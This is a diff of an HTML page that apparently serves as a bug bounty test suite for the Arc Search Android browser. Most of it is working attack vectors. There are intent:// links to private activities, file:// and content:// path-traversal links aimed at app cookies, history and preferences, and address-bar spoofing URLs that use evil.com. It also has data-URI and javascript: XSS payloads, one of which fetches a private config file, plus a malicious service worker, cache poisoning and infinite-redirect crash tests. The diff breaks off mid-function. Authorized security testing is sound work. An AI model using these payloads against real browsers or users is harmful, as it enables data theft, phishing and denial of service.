@@ -3,388 +3,583 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Arc Search Android - Bug Bounty Test Suite</title>
+    <title>Arc Search Android - Complete Bug Bounty Test Suite v2.0</title>
     <style>
-        body { font-family: monospace; background: #0d0d0d; color: #00ff41; padding: 20px; }
-        .box { background: #1a1a1a; border: 1px solid #00ff41; padding: 15px; margin: 10px 0; border-radius: 8px; }
-        button { background: #00ff41; color: #000; border: none; padding: 10px 20px; margin: 5px; cursor: pointer; font-weight: bold; border-radius: 4px; }
-        button:hover { background: #00cc33; }
-        input { background: #1a1a1a; color: #00ff41; border: 1px solid #00ff41; padding: 8px; width: 80%; }
-        .danger { color: #ff4444; }
-        .success { color: #00ff41; }
-        hr { border-color: #00ff41; }
-        iframe { width: 100%; height: 300px; border: 1px solid #333; }
-        
-        /* For Fullscreen Fake UI */
-        #fakeBrowserUI { display:none; background:#202124; padding:15px; text-align:center; border-bottom:1px solid #555; width: 100%; box-sizing: border-box; }
-        #fakeBrowserUI span { color:#fff; font-size: 16px; font-family: sans-serif;}
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Courier New', monospace; 
+            background: #0a0a0a; 
+            color: #00ff41; 
+            padding: 15px; 
+            max-width: 800px; 
+            margin: 0 auto;
+        }
+        .header { 
+            background: #1a1a1a; 
+            border: 2px solid #00ff41; 
+            padding: 15px; 
+            margin-bottom: 20px;
+            text-align: center;
+            border-radius: 10px;
+        }
+        .header h1 { font-size: 20px; color: #ff4444; }
+        .header p { font-size: 12px; color: #888; }
+        .section { 
+            background: #111; 
+            border: 1px solid #333; 
+            padding: 15px; 
+            margin: 15px 0; 
+            border-radius: 8px;
+        }
+        .section h2 { 
+            font-size: 16px; 
+            color: #ffaa00; 
+            border-bottom: 1px solid #333; 
+            padding-bottom: 8px;
+            margin-bottom: 12px;
+        }
+        .section h2 .badge { 
+            font-size: 10px; 
+            background: #ff4444; 
+            color: #fff; 
+            padding: 2px 8px; 
+            border-radius: 10px;
+            margin-left: 8px;
+        }
+        .link-group { 
+            display: flex; 
+            flex-wrap: wrap; 
+            gap: 8px; 
+            margin: 8px 0;
+        }
+        .link-group a, .link-group button { 
+            background: #1a1a1a; 
+            color: #00ff41; 
+            border: 1px solid #00ff41; 
+            padding: 8px 14px; 
+            font-size: 12px; 
+            cursor: pointer; 
+            border-radius: 4px;
+            text-decoration: none;
+            font-family: monospace;
+            transition: all 0.2s;
+        }
+        .link-group a:hover, .link-group button:hover { 
+            background: #00ff41; 
+            color: #000; 
+        }
+        .link-group a.danger { border-color: #ff4444; color: #ff4444; }
+        .link-group a.danger:hover { background: #ff4444; color: #000; }
+        .link-group a.warning { border-color: #ffaa00; color: #ffaa00; }
+        .link-group a.warning:hover { background: #ffaa00; color: #000; }
+        .log-box { 
+            background: #0a0a0a; 
+            border: 1px solid #333; 
+            height: 180px; 
+            overflow-y: scroll; 
+            padding: 10px; 
+            font-size: 11px; 
+            color: #888;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+        .log-box .timestamp { color: #555; }
+        .log-box .success { color: #00ff41; }
+        .log-box .danger { color: #ff4444; }
+        .log-box .warning { color: #ffaa00; }
+        .log-box .info { color: #4488ff; }
+        .note { 
+            font-size: 11px; 
+            color: #666; 
+            margin-top: 5px;
+            padding: 5px;
+            background: #0a0a0a;
+            border-radius: 4px;
+        }
+        .btn-clear { 
+            background: #333; 
+            color: #fff; 
+            border: none; 
+            padding: 5px 15px; 
+            cursor: pointer; 
+            border-radius: 4px;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+        .btn-clear:hover { background: #555; }
     </style>
 </head>
 <body>
 
-    <h1>🧪 Arc Search Android - Bug Bounty Test Suite</h1>
-    <p><span class="danger">⚠️ USE ONLY FOR AUTHORIZED TESTING</span> | Target: <strong>Address Bar Spoofing • Redirects • Popups • Sandbox Bypass • Intents</strong></p>
-    <hr>
+<div class="header">
+    <h1>🧪 Arc Search Android - Bug Bounty Suite v2.0</h1>
+    <p>⚠️ FOR AUTHORIZED SECURITY TESTING ONLY | Target: Address Bar Spoofing · Intent Bypass · File Access · XSS · RCE</p>
+    <p style="font-size:10px;color:#ff4444;margin-top:5px;">🔴 Click each link and WATCH ADDRESS BAR carefully!</p>
+</div>
 
-    <!-- ========== TEST 1: IFRAME SPOOF ========== -->
-    <div class="box">
-        <h2>🎯 Test 1: Iframe URL Spoofing</h2>
-        <p>Ye iframe <strong>google.com</strong> dikha raha hai, lekin address bar me kya show ho raha?</p>
-        <iframe src="https://www.google.com" id="testIframe"></iframe>
-        <br><br>
-        <button onclick="spoofIframe()">🔄 Spoof Iframe Source</button>
-        <button onclick="resetIframe()">↩️ Reset</button>
-        <p id="iframeStatus" class="success">Status: Ready</p>
+<!-- ==================== SECTION 1: INTENT:// ==================== -->
+<div class="section">
+    <h2>📱 1. Intent:// URL Exploits <span class="badge">HIGH</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Android intents — private activities, file access, component launch</p>
+    <div class="link-group">
+        <a href="intent:#Intent;component=com.thebrowser.arc/.SettingsActivity;end" class="danger">Settings Activity</a>
+        <a href="intent:#Intent;component=com.thebrowser.arc/.DebugActivity;end" class="danger">Debug Activity</a>
+        <a href="intent:#Intent;component=com.thebrowser.arc/.WebAppActivity;S.browser_fallback_url=https://evil.com;end" class="danger">WebApp + Fallback</a>
+        <a href="intent:#Intent;S.url=file:///data/data/com.thebrowser.arc/shared_prefs/config.xml;end" class="danger">File via Intent</a>
+        <a href="intent:#Intent;S.url=content://com.thebrowser.arc.fileprovider/../../data/data/com.thebrowser.arc/shared_prefs/;end" class="danger">Content Provider</a>
+        <a href="intent:#Intent;SEL;component=com.thebrowser.arc/.SettingsActivity;SEL;component=com.thebrowser.arc/.DebugActivity;end" class="warning">Multiple Selectors</a>
+        <a href="intent://#Intent;action=android.settings.SETTINGS;end" class="warning">System Settings</a>
+        <a href="intent://#Intent;action=android.intent.action.VIEW;data=content://com.thebrowser.arc/shared_prefs;end" class="warning">Content Intent</a>
     </div>
+    <div class="note">💡 Check if any private activity opens OR if app crashes</div>
+</div>
 
-    <!-- ========== TEST 2: POPUP & WINDOW.OPEN ========== -->
-    <div class="box">
-        <h2>🎯 Test 2: Popup / window.open() Attacks</h2>
-        <p>Ye check karega ki Arc Search popup ko handle kaise karta hai aur kya address bar me fake URL show hota hai?</p>
-        <button onclick="openFakePopup()">📤 Open Fake Popup (google.com)</button>
-        <button onclick="openBlankPopup()">📄 Open Blank Popup with URL Manipulation</button>
-        <button onclick="testAuthSpoof()">🔐 Test HTTP Auth Spoofing</button>
-        <p id="popupStatus" class="success">Status: Ready</p>
+<!-- ==================== SECTION 2: FILE:// ==================== -->
+<div class="section">
+    <h2>📂 2. File:// Protocol Access <span class="badge">HIGH</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Local file system access — private app data, system files</p>
+    <div class="link-group">
+        <a href="file:///data/data/com.thebrowser.arc/shared_prefs/" class="danger">App Shared Prefs</a>
+        <a href="file:///data/data/com.thebrowser.arc/databases/" class="danger">App Databases</a>
+        <a href="file:///data/data/com.thebrowser.arc/app_arc/cookies" class="danger">App Cookies</a>
+        <a href="file:///data/data/com.thebrowser.arc/app_arc/History" class="danger">Browser History</a>
+        <a href="file:///sdcard/Android/data/com.thebrowser.arc/" class="warning">External Data</a>
+        <a href="file:///etc/hosts" class="danger">System Hosts</a>
+        <a href="file:///proc/self/cmdline" class="danger">Process Info</a>
+        <a href="file:///system/build.prop" class="danger">Build Properties</a>
+        <a href="file:///data/data/com.thebrowser.arc/shared_prefs/config.xml" class="warning">Specific Config</a>
     </div>
+    <div class="note">💡 If any file opens with content visible → CRITICAL BUG!</div>
+</div>
 
-    <!-- ========== TEST 3: REDIRECT CHAIN ========== -->
-    <div class="box">
-        <h2>🎯 Test 3: Redirect Chain & History Manipulation</h2>
-        <p>Multiple redirects ke through address bar spoof check karega.</p>
-        <button onclick="startRedirectChain()">🔗 Start Redirect Chain</button>
-        <button onclick="historyPushState()">📜 history.pushState() Test</button>
-        <p id="redirectStatus" class="success">Status: Ready</p>
+<!-- ==================== SECTION 3: URL PARSING SPOOFING ==================== -->
+<div class="section">
+    <h2>🎭 3. Address Bar Spoofing <span class="badge">HIGH</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">URL parsing tricks — @, %, Unicode, backslash</p>
+    <div class="link-group">
+        <a href="https://google.com@evil.com" class="danger">@ Symbol (google.com@evil)</a>
+        <a href="https://evil.com@google.com" class="danger">Reverse @ (evil@google)</a>
+        <a href="https://google.com.evil.com" class="warning">Subdomain Spoof</a>
+        <a href="https://google%2Ecom@evil.com" class="warning">%2E Encoding</a>
+        <a href="https://google.com%09.evil.com" class="danger">Tab Injection</a>
+        <a href="https://google.com%0A.evil.com" class="danger">Newline Injection</a>
+        <a href="https://google.com%0D.evil.com" class="danger">CR Injection</a>
+        <a href="https://google.com%00.evil.com" class="danger">Null Byte</a>
+        <a href="https://арс.com" class="warning">Cyrillic 'а' (арс.com)</a>
+        <a href="https://арс-search.com" class="warning">Cyrillic Spoof</a>
+        <a href="https://google.com@evil.com:8080" class="warning">@ + Port</a>
+        <a href="https://google.com@evil.com#@bing.com" class="warning">@ + Fragment</a>
     </div>
+    <div class="note">💡 Address bar should show <b>evil.com</b> but if it shows <b>google.com</b> → BOUNTY!</div>
+</div>
 
-    <!-- ========== TEST 4: SANDBOX BYPASS ========== -->
-    <div class="box">
-        <h2>🎯 Test 4: Sandbox / SOP Bypass Attempts</h2>
-        <p>Cross-origin access aur postMessage vulnerabilities check karega.</p>
+<!-- ==================== SECTION 4: DATA URI & XSS ==================== -->
+<div class="section">
+    <h2>🧪 4. Data URI / XSS Vectors <span class="badge">MEDIUM</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Data URIs, blob URLs, javascript execution</p>
+    <div class="link-group">
+        <a href="data:text/html;base64,PGh0bWw+PGJvZHk+PGgxPkZha2UgR29vZ2xlPC9oMT48c2NyaXB0PmFsZXJ0KCdY U1MnKTwvc2NyaXB0PjwvYm9keT48L2h0bWw+" class="danger">Base64 Data URI</a>
+        <a href="data:text/html;charset=utf-8,<html><body><h1>Fake</h1><script>alert('XSS')</script></body></html>" class="danger">JS in Data URI</a>
+        <a href="javascript:alert('XSS via javascript:')" class="danger">javascript: URI</a>
+        <a href="javascript:window.location='file:///data/data/com.thebrowser.arc/shared_prefs/'" class="danger">JS + file://</a>
+        <a href="data:text/html,<html><body><script>fetch('file:///data/data/com.thebrowser.arc/shared_prefs/config.xml').then(r=>r.text()).then(d=>alert(d))</script></body></html>" class="danger">JS + file fetch</a>
+    </div>
+    <div class="link-group">
+        <button onclick="testBlob()">🔴 Blob URL Test</button>
+        <button onclick="testDataIframe()">🔴 Data URI Iframe</button>
+        <button onclick="testEval()">🔴 Eval via Data URI</button>
+    </div>
+    <div class="note">💡 If alert() executes → XSS, if file content appears → CRITICAL!</div>
+</div>
+
+<!-- ==================== SECTION 5: CONTENT PROVIDER ==================== -->
+<div class="section">
+    <h2>🗄️ 5. Content Provider Exploits <span class="badge">HIGH</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Content URIs, path traversal, file disclosure</p>
+    <div class="link-group">
+        <a href="content://com.thebrowser.arc.fileprovider/root/data/data/com.thebrowser.arc/shared_prefs/" class="danger">FileProvider Root</a>
+        <a href="content://com.thebrowser.arc.fileprovider/../../data/data/com.thebrowser.arc/shared_prefs/" class="danger">Path Traversal</a>
+        <a href="content://com.thebrowser.arc.fileprovider/../../../../etc/hosts" class="danger">Traversal to /etc</a>
+        <a href="content://com.thebrowser.arc/shared_prefs/" class="warning">Shared Prefs Content</a>
+        <a href="content://com.thebrowser.arc/databases/" class="warning">Databases Content</a>
+        <a href="content://com.android.chrome.FileProvider/" class="warning">Chrome FileProvider</a>
+        <a href="content://com.android.browser.fileprovider/" class="warning">Browser FileProvider</a>
+        <a href="content://media/external/images/media/" class="warning">Media Images</a>
+    </div>
+    <div class="note">💡 If any file content or directory listing appears → DATA LEAK!</div>
+</div>
+
+<!-- ==================== SECTION 6: REDIRECT CHAIN ==================== -->
+<div class="section">
+    <h2>🔄 6. Redirect & History Manipulation <span class="badge">MEDIUM</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Redirect chains, history.pushState, address bar freeze</p>
+    <div class="link-group">
+        <button onclick="redirectChain()">🔴 3-Step Redirect Chain</button>
+        <button onclick="historyPushSpoof()">🔴 history.pushState Spoof</button>
+        <button onclick="metaRefresh()">🔴 Meta Refresh Spoof</button>
+        <button onclick="doubleRedirect()">🔴 Double Redirect</button>
+        <button onclick="infiniteRedirect()">🔴 Infinite Redirect (Stress)</button>
+    </div>
+    <div class="note">💡 Check if address bar shows correct domain after redirects</div>
+</div>
+
+<!-- ==================== SECTION 7: SERVICE WORKER ==================== -->
+<div class="section">
+    <h2>⚙️ 7. Service Worker Attacks <span class="badge">MEDIUM</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Service worker interception, cache poisoning</p>
+    <div class="link-group">
+        <button onclick="registerSW()">🔴 Register Malicious SW</button>
+        <button onclick="unregisterSW()">🔄 Unregister SW</button>
+        <button onclick="cachePoison()">🔴 Cache Poison Attempt</button>
+        <button onclick="checkCache()">📦 Check Cache</button>
+    </div>
+    <div class="note">💡 If SW intercepts requests → Persistent XSS/Phishing possible</div>
+</div>
+
+<!-- ==================== SECTION 8: CRASH / DOS ==================== -->
+<div class="section">
+    <h2>💥 8. Crash / DoS Vectors <span class="badge">MEDIUM</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Long URLs, malformed input, resource exhaustion</p>
+    <div class="link-group">
+        <a href="https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.google.com" class="warning">Long Subdomain (Buffer)</a>
+        <a href="https://google.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" class="warning">Long Path</a>
+        <a href="intent:#Intent;component=com.thebrowser.arc/.SettingsActivity;S.browser_fallback_url=https://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com;end" class="warning">Intent + Long URL</a>
+        <a href="file:///aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" class="warning">Long file:// path</a>
+    </div>
+    <button onclick="crashTest()">🔴 Crash via Large Data</button>
+    <div class="note">💡 If app crashes → DoS bug (CVSS 5.0+ possible)</div>
+</div>
+
+<!-- ==================== SECTION 9: MIXED CONTENT ==================== -->
+<div class="section">
+    <h2>🔓 9. Mixed Content / HTTPS Downgrade <span class="badge">LOW</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">HTTP on HTTPS pages, mixed content warnings bypass</p>
+    <div class="link-group">
+        <a href="http://example.com" class="warning">HTTP to HTTP</a>
+        <a href="https://httpbin.org/redirect-to?url=http://example.com" class="warning">HTTPS → HTTP Redirect</a>
+        <a href="https://example.com" onclick="injectHTTP()">🔴 Inject HTTP iframe</a>
+    </div>
+    <div class="note">💡 Check if browser blocks mixed content or shows warning</div>
+</div>
+
+<!-- ==================== SECTION 10: CUSTOM ARC:// ==================== -->
+<div class="section">
+    <h2>🔧 10. Arc:// Internal Protocols <span class="badge">HIGH</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Internal Arc protocols — if any open, it's a bug</p>
+    <div class="link-group">
+        <a href="arc://settings" class="danger">arc://settings</a>
+        <a href="arc://flags" class="danger">arc://flags</a>
+        <a href="arc://version" class="danger">arc://version</a>
+        <a href="arc://gpu" class="danger">arc://gpu</a>
+        <a href="arc://histograms" class="danger">arc://histograms</a>
+        <a href="arc://net-export" class="danger">arc://net-export</a>
+        <a href="arc://policy" class="danger">arc://policy</a>
+        <a href="arc://settings/../../../../../data/data/com.thebrowser.arc/shared_prefs/" class="danger">arc:// + Path Traversal</a>
+        <a href="arc://settings%00.google.com" class="danger">Null Byte in arc://</a>
+    </div>
+    <div class="note">💡 If any arc:// page opens → INTERNAL PAGE ACCESS (High severity!)</div>
+</div>
+
+<!-- ==================== SECTION 11: CROSS-ORIGIN ==================== -->
+<div class="section">
+    <h2>🌐 11. Cross-Origin / SOP Bypass <span class="badge">MEDIUM</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">postMessage, fetch, iframe cross-origin access</p>
+    <div class="link-group">
         <button onclick="testPostMessage()">📨 PostMessage Test</button>
-        <button onclick="testFetch()">🌐 Fetch Cross-Origin Test</button>
-        <p id="sandboxStatus" class="success">Status: Ready</p>
+        <button onclick="testFetch()">🌐 Fetch Cross-Origin</button>
+        <button onclick="testIframeAccess()">🖼️ Iframe Cross-Access</button>
+        <button onclick="testCORS()">🔗 CORS Bypass Attempt</button>
     </div>
+    <div class="note">💡 If cross-origin data accessed → SOP Bypass!</div>
+</div>
 
-    <!-- ========== TEST 5: DEEP LINK / INTENT ========== -->
-    <div class="box">
-        <h2>🎯 Test 5: Deep Link / Intent URI Spoof</h2>
-        <p>Kya Arc Search intent URIs ko sahi se handle karta hai? Ye fake `arc://` aur `intent://` links hain.</p>
-        <button onclick="fakeDeepLink()">🔗 Fake arc://settings</button>
-        <button onclick="fakeIntent()">📲 Fake intent://google.com</button>
-        <button onclick="aggressiveIntent()">⚙️ Aggressive Intent (Settings App)</button>
-        <p id="deepLinkStatus" class="success">Status: Ready</p>
-    </div>
-
-    <!-- ========== TEST 6: UI REDRESS / TAPJACKING ========== -->
-    <div class="box">
-        <h2>🎯 Test 6: UI Redress / Tapjacking</h2>
-        <p>Transparent iframe overlay ke through click jacking attempt.</p>
-        <button onclick="injectOverlay()">🕵️ Inject Overlay Iframe</button>
+<!-- ==================== SECTION 12: TAPJACKING ==================== -->
+<div class="section">
+    <h2>👆 12. UI Redress / Tapjacking <span class="badge">MEDIUM</span></h2>
+    <p style="font-size:12px;color:#888;margin-bottom:8px;">Transparent overlays, clickjacking, UI spoofing</p>
+    <div class="link-group">
+        <button onclick="injectOverlay()">🕵️ Inject Transparent Overlay</button>
         <button onclick="removeOverlay()">❌ Remove Overlay</button>
-        <div id="overlayContainer" style="position:relative; height:100px;"></div>
-        <p id="uiStatus" class="success">Status: Ready</p>
+        <button onclick="injectClickjack()">🎯 Clickjack Attempt</button>
     </div>
+    <div id="overlayContainer" style="position:relative;height:80px;background:#0a0a0a;border:1px dashed #333;margin-top:8px;"></div>
+    <div class="note">💡 If overlay captures clicks → Tapjacking (Medium severity)</div>
+</div>
 
-    <!-- ========== TEST 7: FULLSCREEN & UI TRAP ========== -->
-    <div class="box" id="fullscreenBox">
-        <h2>🎯 Test 7: Fullscreen API & Fake UI Trap</h2>
-        <p>Fullscreen API ka use karke address bar hide karna aur fake URL dikhana.</p>
-        <div id="fakeBrowserUI">
-            🔒 <span>https://www.google.com</span>
-        </div>
-        <button onclick="triggerFullscreen()">🔲 Enter Fullscreen (Fake UI)</button>
-        <button onclick="exitFullscreen()">↩️ Exit Fullscreen</button>
-        <p id="fullscreenStatus" class="success">Status: Ready</p>
-    </div>
+<!-- ==================== LOGS ==================== -->
+<div class="section" style="border-color:#00ff41;">
+    <h2>📋 Test Log</h2>
+    <div id="log" class="log-box"></div>
+    <button class="btn-clear" onclick="clearLog()">🗑️ Clear Log</button>
+    <button class="btn-clear" onclick="exportLog()">📤 Export Log</button>
+    <span style="font-size:10px;color:#666;margin-left:10px;">Click any link → logs automatically</span>
+</div>
 
-    <!-- ========== TEST 8: LOCAL FILE & CONTENT SCHEMES ========== -->
-    <div class="box">
-        <h2>🎯 Test 8: Local File / Content Provider Access</h2>
-        <p>Android ki local system files ya content provider ko access karne ka test.</p>
-        <button onclick="testFileScheme()">📂 Open file:///etc/hosts</button>
-        <button onclick="testContentScheme()">📦 Open content://contacts/people</button>
-        <p id="localFileStatus" class="success">Status: Ready</p>
-    </div>
+<!-- ==================== SCRIPT ==================== -->
+<script>
+// ===== LOGGING SYSTEM =====
+function log(msg, type = 'info') {
+    const logDiv = document.getElementById('log');
+    const time = new Date().toLocaleTimeString();
+    const className = type;
+    logDiv.innerHTML += `<span class="timestamp">[${time}]</span> <span class="${className}">${msg}</span><br>`;
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
 
-    <!-- ========== TEST 9: WEB SHARE API SPOOFING ========== -->
-    <div class="box">
-        <h2>🎯 Test 9: Web Share API Abuse</h2>
-        <p>Native Share Dialog me URL spoof karne ki koshish.</p>
-        <button onclick="triggerWebShare()">📤 Share Fake Link</button>
-        <p id="shareStatus" class="success">Status: Ready</p>
-    </div>
+function clearLog() {
+    document.getElementById('log').innerHTML = '';
+    log('🗑️ Log cleared');
+}
 
-    <!-- ========== TEST 10: DRIVE-BY DOWNLOAD / BLOB URI ========== -->
-    <div class="box">
-        <h2>🎯 Test 10: Drive-by Download & Blob URI</h2>
-        <p>Bina user permission ke Blob URI se file download trigger karna.</p>
-        <button onclick="triggerBlobDownload()">💾 Trigger Blob Download (.apk)</button>
-        <p id="downloadStatus" class="success">Status: Ready</p>
-    </div>
+function exportLog() {
+    const logText = document.getElementById('log').innerText;
+    const blob = new Blob([logText], {type: 'text/plain'});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'arc_bug_bounty_log.txt';
+    a.click();
+    log('📤 Log exported');
+}
 
-    <!-- ========== TEST 11: SCHEME FLOODING (DoS) ========== -->
-    <div class="box">
-        <h2>🎯 Test 11: Intent / Scheme Flooding (Crash Test)</h2>
-        <p>Lagatar intents open karke browser ko crash karne ki koshish. <span class="danger">⚠️ MAY CRASH BROWSER</span></p>
-        <button onclick="startSchemeFlood()">🌊 Start Scheme Flood</button>
-        <p id="floodStatus" class="success">Status: Ready</p>
-    </div>
+// Log all link clicks
+document.querySelectorAll('a').forEach(a => {
+    a.addEventListener('click', function(e) {
+        const text = this.textContent.trim() || this.href;
+        log(`🔗 Clicked: ${text}`, 'warning');
+        setTimeout(() => {
+            log(`📌 Check address bar for: ${this.href}`, 'info');
+        }, 500);
+    });
+});
 
-    <!-- ========== LOGGING ========== -->
-    <div class="box">
-        <h2>📋 Test Log</h2>
-        <div id="log" style="background:#0a0a0a; padding:10px; height:200px; overflow-y:scroll; font-size:12px; color:#aaa;"></div>
-        <button onclick="clearLog()">🗑️ Clear Log</button>
-    </div>
+// ===== TEST FUNCTIONS =====
 
-    <!-- ========== SCRIPT ========== -->
-    <script>
-        function log(msg) {
-            const logDiv = document.getElementById('log');
-            const time = new Date().toLocaleTimeString();
-            logDiv.innerHTML += `[${time}] ${msg}<br>`;
-            logDiv.scrollTop = logDiv.scrollHeight;
+// --- INTENT TESTS ---
+// (Links already handle these)
+
+// --- BLOB / DATA URI ---
+function testBlob() {
+    const html = '<html><body><h1>Fake Google</h1><script>alert("Blob executed!")</script></body></html>';
+    const blob = new Blob([html], {type: 'text/html'});
+    const url = URL.createObjectURL(blob);
+    window.open(url, '_blank');
+    log('🔴 Blob URL created and opened', 'danger');
+}
+
+function testDataIframe() {
+    const iframe = document.createElement('iframe');
+    iframe.src = "data:text/html;charset=utf-8,<html><body><h1>Iframe Content</h1><script>alert('Iframe alert')</script></body></html>";
+    iframe.style.cssText = 'width:100%;height:150px;border:1px solid #333;margin-top:8px;';
+    document.body.appendChild(iframe);
+    log('🔴 Data URI iframe injected', 'danger');
+}
+
+function testEval() {
+    eval("alert('Eval via button click!')");
+    log('🔴 Eval executed', 'danger');
+}
+
+// --- REDIRECTS ---
+function redirectChain() {
+    log('🔴 Starting redirect chain: google.com → example.com → evil.com', 'danger');
+    setTimeout(() => { window.location = 'https://www.google.com'; }, 500);
+    setTimeout(() => { window.location = 'https://www.example.com'; }, 1500);
+    setTimeout(() => { window.location = 'https://evil.com'; }, 2500);
+    log('⚠️ Watch address bar during redirects!', 'warning');
+}
+
+function historyPushSpoof() {
+    history.pushState({}, 'Google', 'https://www.google.com/fake');
+    log('🔴 history.pushState() to google.com/fake', 'danger');
+}
+
+function metaRefresh() {
+    const meta = document.createElement('meta');
+    meta.httpEquiv = 'refresh';
+    meta.content = '0;url=https://evil.com';
+    document.head.appendChild(meta);
+    log('🔴 Meta refresh to evil.com', 'danger');
+}
+
+function doubleRedirect() {
+    log('🔴 Double redirect triggered', 'danger');
+    window.location = 'https://httpbin.org/redirect-to?url=https://evil.com';
+}
+
+function infiniteRedirect() {
+    log('🔴 Infinite redirect loop started (stress test)', 'danger');
+    setInterval(() => { window.location = 'https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=https://httpbin.org/redirect-to?url=https://evil.com'; }, 100);
+}
+
+// --- SERVICE WORKER ---
+async function registerSW() {
+    try {
+        const swCode = `
+            self.addEventListener('install', function(e) { e.waitUntil(self.skipWaiting()); });
+            self.addEventListener('activate', function(e) { e.waitUntil(self.clients.claim()); });
+            self.addEventListener('fetch', function(e) {
+                e.respondWith(new Response('Intercepted by SW!', {status: 200, headers: {'Content-Type': 'text/html'}}));
+            });
+        `;
+        const blob = new Blob([swCode], {type: 'application/javascript'});
+        const swUrl = URL.createObjectURL(blob);
+        const reg = await navigator.serviceWorker.register(swUrl);
+        log('✅ Service Worker registered (check if it intercepts)', 'success');
+        console.log('SW Registered:', reg);
+    } catch(e) {
+        log('❌ SW Registration failed: ' + e.message, 'danger');
+    }
+}
+
+async function unregisterSW() {
+    const regs = await navigator.serviceWorker.getRegistrations();
+    regs.forEach(r => r.unregister());
+    log('🔄 Service Workers unregistered', 'info');
+}
+
+async function cachePoison() {
+    try {
+        const cache = await caches.open('malicious-cache');
+        await cache.put('https://example.com', new Response('POISONED!', {headers: {'Content-Type': 'text/html'}}));
+        log('🔴 Cache poisoned for example.com', 'danger');
+    } catch(e) {
+        log('❌ Cache poison failed: ' + e.message, 'danger');
+    }
+}
+
+async function checkCache() {
+    try {
+        const cache = await caches.open('malicious-cache');
+        const res = await cache.match('https://example.com');
+        if (res) {
+            const text = await res.text();
+            log(`📦 Cache contains: ${text}`, 'info');
+        } else {
+            log('📦 No cache entry found', 'info');
         }
+    } catch(e) {
+        log('❌ Cache check failed: ' + e.message, 'danger');
+    }
+}
 
-        function clearLog() {
-            document.getElementById('log').innerHTML = '';
-        }
+// --- CROSS-ORIGIN ---
+function testPostMessage() {
+    const iframe = document.querySelector('iframe') || document.createElement('iframe');
+    if (!iframe.parentNode) {
+        iframe.src = 'https://example.com';
+        iframe.style.cssText = 'width:100%;height:150px;border:1px solid #333;margin-top:8px;';
+        document.body.appendChild(iframe);
+    }
+    try {
+        iframe.contentWindow.postMessage('ARC_TEST_DATA', '*');
+        log('🔴 PostMessage sent to iframe', 'danger');
+    } catch(e) {
+        log('❌ PostMessage blocked: ' + e.message, 'danger');
+    }
+}
 
-        // ----- TEST 1: IFRAME SPOOF -----
-        function spoofIframe() {
-            const iframe = document.getElementById('testIframe');
-            iframe.src = 'https://www.wikipedia.org';
-            document.getElementById('iframeStatus').innerHTML = '⚠️ Iframe ab Wikipedia dikha raha hai — address bar check karo!';
-            log('🔴 TEST 1: Iframe src changed to wikipedia.org');
-        }
+function testFetch() {
+    fetch('https://api.github.com/users/octocat')
+        .then(res => res.json())
+        .then(data => {
+            log('✅ Fetch successful: ' + JSON.stringify(data).substring(0, 100), 'success');
+        })
+        .catch(err => {
+            log('❌ Fetch failed: ' + err.message, 'danger');
+        });
+}
 
-        function resetIframe() {
-            document.getElementById('testIframe').src = 'https://www.google.com';
-            document.getElementById('iframeStatus').innerHTML = '✅ Reset to Google';
-            log('🔄 Iframe reset to google.com');
-        }
+function testIframeAccess() {
+    const iframe = document.querySelector('iframe');
+    if (!iframe) {
+        log('❌ No iframe found', 'danger');
+        return;
+    }
+    try {
+        const doc = iframe.contentDocument || iframe.contentWindow.document;
+        log('✅ Iframe DOM accessible: ' + doc.title, 'success');
+    } catch(e) {
+        log('❌ Iframe access blocked (SOP): ' + e.message, 'info');
+    }
